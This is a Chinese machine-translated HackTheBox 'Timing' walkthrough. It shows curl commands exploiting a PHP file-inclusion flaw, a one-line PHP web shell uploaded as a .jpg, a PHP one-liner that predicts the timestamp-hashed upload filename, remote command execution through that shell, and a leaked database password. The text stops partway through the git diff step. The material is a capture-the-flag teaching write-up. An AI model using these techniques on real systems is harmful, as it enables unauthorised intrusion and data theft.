<html>
<head>
<title>Timing from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">来自HackTheBox的时序—详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/timing-from-hackthebox-detailed-walkthrough-7671466227fd?source=collection_archive---------1-----------------------#2022-06-03">https://infosecwriteups.com/timing-from-hackthebox-detailed-walkthrough-7671466227fd?source=collection_archive---------1-----------------------#2022-06-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="e3e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向您展示完成盒子所需的所有工具和技术。</p><p id="5a08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://www.hackthebox.com/home/machines/profile/421" rel="noopener ugc nofollow" target="_blank">定时</a>是由<a class="ae kl" href="https://www.hackthebox.com/home/users/profile/476556" rel="noopener ugc nofollow" target="_blank"> irogir </a>在<a class="ae kl" href="https://www.hackthebox.com/home" rel="noopener ugc nofollow" target="_blank"> HackTheBox </a>上制作的简易水平仪。它主要关注基于web和shell的应用程序漏洞。</p><h1 id="4747" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">机器信息</h1><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi lk"><img src="../Images/d3f6a72417d1199fe211b9a9605a9d65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*9F-Pju3p5vY679p3.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">来自黑客盒子的计时</figcaption></figure><p id="cef4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的起点是网站上端口80上的一个登录页面，我们通过用wfuzz查找文件和文件夹找到了一条进入该页面的途径。使用一个易受攻击的php页面，我们会泄露凭证，从而获得访问权限。进一步的枚举和代码审查允许我们将我们在web应用程序中的角色升级为管理员。在那里，我们有一种方法来上传包含代码执行的恶意文档。我们找到了一种方法来获得它的唯一文件名，从而允许我们远程执行机器上的命令。我们过滤一个备份，并在其中找到凭证以获取ssh作为用户。升级到root是通过我们在包装盒上找到的一个易受攻击的应用程序，我们利用它对wget的不安全使用来获得root外壳。</p><h1 id="bf4f" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">初步侦察</h1><p id="842b" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/006f2342b7a2d9d7af6765e84815dc71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cgDoysoq91D5V3ynwnS2Yg.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">盒子的Nmap扫描</figcaption></figure><p id="c261" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只打开了两个端口，让我们看看端口80上的Apache:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mg"><img src="../Images/8d5611025098c14c464b4e7b45041b98.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*CFJUkYdWr3uoBnmy.png"/></div></div></figure><h1 id="950e" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Gobuster枚举</h1><p id="642a" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我们有一个登录框，但没有别的。我尝试了一些显而易见的凭证，但没有得到任何地方，所以让我们试试gobuster:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mh"><img src="../Images/cc281469af6a58e7f3ab561cd29905d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wby1XnigWwAuA9l1VVBaqg.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">gobuster扫描子文件夹</figcaption></figure><p id="aa1d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">没有太多线索，所以我试着寻找带有php扩展名的文件，发现了这个:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mi"><img src="../Images/ce68f059a419e9ddd76f46c760779563.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AgQJKlq5S6KtOsWSBW1QsQ.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">gobuster扫描php文件</figcaption></figure><h1 id="e764" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Wfuzz</h1><p id="50ac" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">有趣的是，image.php的文件没有像其他文件一样重定向到login.php。我试着弄模糊，花了我不少时间，但最终我得到了这个:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mj"><img src="../Images/31534af4f4549e854748c16bf7186f39.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DKDSDZ815h-aMvJUQYWbCg.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">模糊参数</figcaption></figure><h1 id="4397" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">转储密码</h1><p id="6513" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">通过使用img参数和fuzzing，我得到了一些25个字符的响应。这告诉我们web服务器正在做出响应。让我们尝试获取passwd文件:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mk"><img src="../Images/0853aa3ab647251f6d1a7b73807fbab4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5U_lL--zjDDk5XchKBFW2A.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">尝试用curl下载密码文件</figcaption></figure><p id="c7c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，我们有进展了。接下来，我们需要尝试绕过那个过滤器。我用了<a class="ae kl" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter" rel="noopener ugc nofollow" target="_blank">这个</a>，这是我在赏金猎人盒子<a class="ae kl" href="https://pencer.io/ctf/ctf-htb-bountyhunter/#base64-encoded-payload" rel="noopener ugc nofollow" target="_blank">上用的东西</a>:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ml"><img src="../Images/69e567b072709db771eb2dd03189211b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5idYKETuOle4F-gIcBhnOQ.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">用curl抓取密码文件</figcaption></figure><p id="152e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是可行的，响应是base64编码的，因此我们可以解码并使用grep来给出可以登录的帐户:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mm"><img src="../Images/0a9c5d9a768fb680d61aa45057287fa9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uh-XrWilNK9TlAKrmNcHyQ.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">使用curl和base64解码抓取passwd文件</figcaption></figure><h1 id="a017" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">简单的WebApp登录</h1><p id="4ad2" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我们有一个叫aaron的用户。回到我们之前看到的初始登录框，现在使用用户名登录很简单:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mn"><img src="../Images/3a46ffb3e437df1299097dc613a58450.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*FUUK5RAGIUQv7H9S.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">简单的WebApp登录</figcaption></figure><p id="1170" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在这里结束:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mo"><img src="../Images/60994e92ef01adbd8c6942718aa66c1a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*pXBYB8C8ESSgD7Md.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">以用户2身份登录</figcaption></figure><p id="b26e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们不确定此时成为用户2的意义何在，而且一旦登录，您就不能做任何其他事情了。回到我们的gobuster输出，我得到了upload.php文件:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="4698" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~]<br/>└─# curl 'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=upload.php' | base64 -d</span></pre><h1 id="30f6" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">代码审查</h1><p id="30b1" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">浏览代码，很容易看出它做了什么。它获取用户上传的文件，检查它是否有. jpg扩展名，并将其名称存储在$file_name中。然后，它通过获取当前时间的md5散列值并将其与文件名相结合来创建一个唯一的散列值。然后，它将文件存储在/images/uploads中。脚本中有一个需要理解的地方，否则你将会试图确定已经创建的文件名。</p><p id="e42f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看文件的第一部分:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="be5f" class="mu kn iq mq b gy mv mw l mx my">&lt;?php<br/>include("admin_auth_check.php");<br/>$upload_dir = "images/uploads/";<br/><br/>if (!file_exists($upload_dir)) {<br/>    mkdir($upload_dir, 0777, true);<br/>}<br/><br/>$file_hash = uniqid();<br/><br/>$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);<br/>$target_file = $upload_dir . $file_name;</span></pre><p id="8724" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，有一个名为$file_hash的变量是用uniqid()设置的值创建的。这篇文章解释了这个函数是做什么的，但本质上它就像time()，但以微秒为单位，所以是一个更大的值。重要的一点是:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="b94e" class="mu kn iq mq b gy mv mw l mx my">md5('$file_hash' . time())</span></pre><p id="deb3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在PHP中，单引号和双引号对字符串的作用不同。见<a class="ae kl" href="https://www.geeksforgeeks.org/what-is-the-difference-between-single-quoted-and-double-quoted-strings-in-php/" rel="noopener ugc nofollow" target="_blank">这篇</a>文章，但是基本上他$file_hash变量的值是从来不用的。</p><p id="2374" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们还看到这个文件中包含另一个名为admin_auth_check.php的文件，让我们来看看:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="e1fb" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~]<br/>└─# curl 'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php' | base64 -d<br/><br/>&lt;?php<br/>include_once "auth_check.php";<br/><br/>if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {<br/>    echo "No permission to access this panel!";<br/>    header('Location: ./index.php');<br/>    die();<br/>}<br/>?&gt;</span></pre><p id="9b8a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到该文件正在检查会话角色的值。如果它不等于1，那么你没有访问面板的权限。我们还不知道那是什么意思！</p><h1 id="ac1d" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">WebApp管理员访问</h1><p id="d717" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">回到我们的web浏览器，我们已经有一个认证为aaron的会话。如果您点击顶部的“编辑个人资料”链接，您会看到:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mz"><img src="../Images/c002952fca0cba7513a0a01912e785d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*3io637USPqKb-wKA.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">编辑用户的个人资料</figcaption></figure><p id="0a74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该打嗝了，看看背景中发生了什么。一旦你设置了Burp拦截请求并且你的浏览器设置了使用它，点击网页上的蓝色更新按钮。我们拦截了邮件:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi na"><img src="../Images/4801261d42610dfbe55a8be7f6156912.png" data-original-src="https://miro.medium.com/v2/resize:fit:1198/format:webp/0*xuQSL6RjAwhlsl2w.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">打嗝拦截用户</figcaption></figure><p id="44f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在末尾添加我们的新角色:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/8d3bd1fbe174ca0671f6e5fa68d85a1d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1202/format:webp/0*NfV9SUysSwXApL-k.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">打嗝改变用户的角色</figcaption></figure><p id="1202" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">转发到服务器，然后切换回浏览器:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/f3765fa3274d7a69a4b17e4758f50b46.png" data-original-src="https://miro.medium.com/v2/resize:fit:836/format:webp/0*StLibNhHx9_lo8w4.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">个人资料已更新</figcaption></figure><p id="b29e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到我们的个人资料已更新，现在刷新您的浏览器以查看我们有一个名为管理面板的新选项，单击该选项可进入此处:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/ed503f1e2e241c4648d746362e00f3bc.png" data-original-src="https://miro.medium.com/v2/resize:fit:930/format:webp/0*ZCPlPdfGwSxhGtsV.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">访问管理面板</figcaption></figure><h1 id="8794" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Web外壳</h1><p id="6a75" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我们已经找到了图片上传区域，它使用了我们之前看过的PHP文件。可以肯定这将是我们获得远程代码执行的方法。让我们从一个简单的web shell开始。我们从代码审查中知道，有文件扩展名检查，但没有文件内容检查。我们可以像这样轻松地绕过检查:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="22e3" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~]<br/>└─# cat pencer.jpg<br/>&lt;?php system($_GET[cmd]);?&gt;</span></pre><p id="cee5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们以前已经在尼尼微和T2锻炉中使用过几次了。然而，这里稍微复杂一点，因为生成的文件名前面还有一个当前时间的md5散列。</p><p id="11df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以创建自己简单的文件名生成器来帮助您。这就是PHP文件正在做的事情:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="fc08" class="mu kn iq mq b gy mv mw l mx my">$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);</span></pre><p id="d108" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们测试一下我们自己的版本:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="e521" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing]<br/>└─# date<br/>Wed 22 Dec 17:13:27 GMT 2021</span></pre><p id="3d8e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用当前时间:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="be84" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing]<br/>└─# php -a<br/>Interactive mode enabled<br/>php &gt; echo (md5('$file_hash' . strtotime('Wed 22 Dec 17:13:27 GMT 2021')) . '_pencer.jpg');<br/>01c656c2e2adb93593117cb1b3d12808_pencer.jpg</span></pre><p id="736d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，使用交互式php模式，我们可以从我们检查过的代码中提取一行，并用我的Kali box上的当前时间替换time()。然后添加我们创建的将用于命令执行的文件的名称。生成的文件名是我们上传后需要使用的。</p><p id="a7ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们来真的吧。返回上传表单并选择我们的web shell:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/7983d95f76b58443ada816888f01c9fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:860/format:webp/0*m4JyrxPHu__5NZop.png"/></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">上传图像</figcaption></figure><p id="1908" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">确保您的浏览器设置为使用Burp作为代理，并且该Burp设置为拦截。点击上传图像按钮，然后切换到打嗝，看看它被拦截:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nf"><img src="../Images/509b2084827091f4bcd33a4b6f3ed4fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*3gCrvFv3BjN2RDF7.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">打嗝拦截图像上传</figcaption></figure><p id="1d03" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以在底部看到我们的代码是完整的。右键单击并选择发送到中继器，然后切换到中继器选项卡并单击发送:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ng"><img src="../Images/edb095e9b238767de12f9a9a70f664e2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*SgFFsRtc05TKdik8.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">打嗝重复显示文件上传的日期和时间</figcaption></figure><p id="37bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在右侧看到文件已上传，现在复制并记下服务器响应上的日期和时间:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="570a" class="mu kn iq mq b gy mv mw l mx my">Wed, 22 Dec 2021 17:21:43 GMT</span></pre><p id="5fbf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们像以前一样在PHP中使用它:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="470d" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing]<br/>└─# php -a<br/>Interactive mode enabled<br/>php &gt; echo (md5('$file_hash' . strtotime('Wed, 22 Dec 2021 17:21:43 GMT')) . '_pencer.jpg');<br/>e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg</span></pre><h1 id="b682" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">远程代码执行</h1><p id="4e40" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我们现在有了可以使用curl远程调用的文件名。让我们用whoami来测试一下:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="d068" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing]<br/>└─# curl 'http://timing.htb/image.php?img=images/uploads/e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg&amp;cmd=whoami'<br/>www-data</span></pre><p id="1ff1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那行得通。然而，我花了很长时间试图得到一个反向壳没有运气。回到枚举文件系统，最终我找到了这个:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="9711" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing]<br/>└─# curl 'http://timing.htb/image.php?img=images/uploads/e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg&amp;cmd=ls+-lsa+/opt' <br/>total 624<br/>616 -rw-r--r--  1 root root 627851 Jul 20 22:36 source-files-backup.zip</span></pre><p id="aa53" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一个备份文件，我们一定要看看。首先将其复制到我们有权访问的上传文件夹:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="5515" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing]<br/>└─# curl 'http://timing.htb/image.php?img=images/uploads/e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg&amp;cmd=cp+/opt/source-files-backup.zip+/var/www/html/images/uploads/'</span></pre><p id="8854" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以下载了:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nh"><img src="../Images/a6e19e582c8408d256661361141c5c97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6nC_lupU4z63mo5p5HyGTg.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">使用curl下载backup.zip</figcaption></figure><h1 id="62a0" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">备份文件探索</h1><p id="b5f0" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">拉开拉链看看:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ni"><img src="../Images/c5b23a584c093d646cdc3a345223d83e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iewntDlcSvqVNtKnGmzy7w.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">解压缩备份文件</figcaption></figure><p id="5b5f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">浏览这些文件，我们在db_conn.php中发现了一些有趣的东西:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="b08b" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing/backup]<br/>└─# cat db_conn.php                  <br/>&lt;?php<br/>$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');</span></pre><p id="9e88" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">aaron是否重复使用了mysql密码进行ssh访问:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="0dc2" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing/extracted]<br/>└─# ssh aaron@timing.htb<br/>aaron@timing.htb's password: <br/>Permission denied, please try again.</span></pre><p id="aea4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好吧，那没用。但是，进一步查看备份文件，我们会发现有一个Git存储库。好像有点可疑！</p><h1 id="7976" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">GitTools</h1><p id="5299" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">让我们像在<a class="ae kl" href="https://www.hackthebox.com/home/machines/profile/398" rel="noopener ugc nofollow" target="_blank"> Devzat </a>上一样使用GitTools并提取源文件。如果需要，请下载它们:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="563e" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/devzat]<br/>└─# git clone https://github.com/internetwache/GitTools.git<br/>Cloning into 'GitTools'...<br/>remote: Enumerating objects: 229, done.<br/>remote: Counting objects: 100% (20/20), done.<br/>remote: Compressing objects: 100% (16/16), done.<br/>remote: Total 229 (delta 6), reused 7 (delta 2), pack-reused 209<br/>Receiving objects: 100% (229/229), 52.92 KiB | 1.65 MiB/s, done.<br/>Resolving deltas: 100% (85/85), done.</span></pre><p id="7fb1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对备份文件夹使用提取程序脚本:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nj"><img src="../Images/994fb904841a79fc3f30d1b26e037103.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P_JgXDsBK16b3CIta2G7gg.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">使用GitTools提取git档案</figcaption></figure><p id="fd23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在看看提取器文件:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="bbfe" class="mu kn iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timing]<br/>└─# ll extracted <br/>drwxr-xr-x 5 root root 4096 Dec 22 17:43 0-16de2698b5b122c93461298eab730d00273bd83e<br/>drwxr-xr-x 5 root root 4096 Dec 22 17:43 1-e4e214696159a25c69812571c8214d2bf8736a3f</span></pre><p id="1d29" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有两个提交。就像我们在Devzat上做的一样，我们可以使用diff作为一种简单的方法来查看提交之间发生了什么变化:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf 